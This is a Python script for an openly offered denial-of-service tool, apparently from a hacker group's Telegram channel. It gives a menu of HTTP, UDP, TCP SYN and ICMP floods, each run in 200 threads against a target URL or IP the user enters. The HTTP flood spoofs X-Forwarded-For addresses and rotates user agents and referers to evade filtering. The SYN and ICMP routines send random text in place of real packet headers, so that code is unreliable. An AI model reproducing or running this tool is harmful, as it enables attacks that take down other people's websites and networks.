import threading
import requests
import random
import string
import time
import os
import socket

# ANSI escape codes for colors
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'

def genstr(size):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

def send_http_request(url):
    session = requests.Session()
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
    ]
    
    while True:
        try:
            params = {'q': genstr(random.randint(5, 15))}
            headers = {
                'User-Agent': random.choice(user_agents),  # Random User-Agent
                'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),  # Simulate random IP
                'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com'])  # Random referer
            }
            response = session.get(url, params=params, headers=headers, timeout=10)  # Timeout set to 10 seconds
            status_code = response.status_code
            if status_code == 200:
                print(f"{colors.GREEN}Attack successful [{status_code}]{colors.END} Params: {params}")
            else:
                print(f"{colors.RED}Site down status code: {status_code}{colors.END} Params: {params}")
        except requests.exceptions.RequestException as e:
            print(f"{colors.RED}Request failed: {e}{colors.END}")
            time.sleep(random.randint(1, 3))  # Random backoff time between retries

def send_udp_flood(target_ip, target_port):
    message = genstr(1024).encode('utf-8')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(message, (target_ip, target_port))
            print(f"{colors.CYAN}UDP Flooding {target_ip}:{target_port}{colors.END}")
        except Exception as e:
            print(f"{colors.RED}UDP Flood failed: {e}{colors.END}")
            time.sleep(random.randint(1, 3))  # Random backoff time between retries

def send_tcp_syn_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while True:
        try:
            ip_header = genstr(20).encode('utf-8')
            tcp_header = genstr(20).encode('utf-8')
            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, target_port))
            print(f"{colors.BLUE}TCP SYN Flooding {target_ip}:{target_port}{colors.END}")
        except Exception as e:
            print(f"{colors.RED}TCP SYN Flood failed: {e}{colors.END}")
            time.sleep(random.randint(1, 3))  # Random backoff time between retries

def send_icmp_flood(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while True:
        try:
            packet = genstr(1024).encode('utf-8')
            sock.sendto(packet, (target_ip, 0))
            print(f"{colors.YELLOW}ICMP Flooding {target_ip}{colors.END}")
        except Exception as e:
            print(f"{colors.RED}ICMP Flood failed: {e}{colors.END}")
            time.sleep(random.randint(1, 3))  # Random backoff time between retries

def main_menu():
    os.system('clear')
    header = f"""
{colors.RED}▒█▀▀█ ▀▄▒▄▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ {colors.END}
{colors.GREEN}▒█░░░ ░▒█░░ ▒█░░▒█ ▒█▀▀▀ ▒█▀▀▄ {colors.END}
{colors.CYAN}▒█▄▄█ ▄▀▒▀▄ ▒█▄▄▄█ ▒█░░░ ▒█▄▄█{colors.END}
=======================================
{colors.YELLOW}Our Telegram Channel: {colors.CYAN}https://t.me/CYBER_X_OF_BANGLADESH_BACKUP{colors.END}
{colors.YELLOW}Create by {colors.MAGENTA}@noinadigger{colors.END}
=======================================
"""
    print(header)
    print("Select Attack Method:")
    print("1. HTTP Flood")
    print("2. UDP Flood")
    print("3. TCP SYN Flood")
    print("4. ICMP Flood")
    print("5. Exit")
    
    choice = input("Enter your choice (1-5): ").strip()
    return choice

def main():
    while True:
        choice = main_menu()
        if choice == '1':
            print("Please enter your target URL:")
            url = input("Target URL: ").strip()
            threads = [threading.Thread(target=send_http_request, args=(url,)) for _ in range(200)]
        elif choice == '2':
            print("Please enter your target IP and port (format: IP:PORT):")
            target_ip, target_port = input("Target IP:PORT: ").strip().split(':')
            target_port = int(target_port)
            threads = [threading.Thread(target=send_udp_flood, args=(target_ip, target_port)) for _ in range(200)]
        elif choice == '3':
            print("Please enter your target IP and port (format: IP:PORT):")
            target_ip, target_port = input("Target IP:PORT: ").strip().split(':')
            target_port = int(target_port)
            threads = [threading.Thread(target=send_tcp_syn_flood, args=(target_ip, target_port)) for _ in range(200)]
        elif choice == '4':
            print("Please enter your target IP:")
            target_ip = input("Target IP: ").strip()
            threads = [threading.Thread(target=send_icmp_flood, args=(target_ip,)) for _ in range(200)]
        elif choice == '5':
            print(f"{colors.MAGENTA}Exiting...{colors.END}")
            break
        else:
            print(f"{colors.RED}Invalid choice!{colors.END}")
            continue
        
        # Start threads
        for t in threads:
            t.start()
        
        # Wait for all threads to complete
        for t in threads:
            t.join()

if __name__ == "__main__":
    main()
